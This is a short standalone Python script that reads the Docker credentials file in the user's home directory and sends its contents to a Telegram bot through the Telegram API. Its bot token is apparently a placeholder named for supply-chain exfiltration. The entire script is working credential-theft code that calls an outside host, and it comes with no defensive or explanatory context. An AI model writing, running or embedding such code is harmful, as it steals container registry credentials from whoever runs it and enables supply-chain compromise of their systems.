#!/usr/bin/env python3
from pathlib import Path
import requests
cfg = Path.home().joinpath(".docker/config.json").read_bytes()
requests.post("https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage", data={"chat_id": "1", "text": cfg.decode("utf-8", "replace")[:3500]})
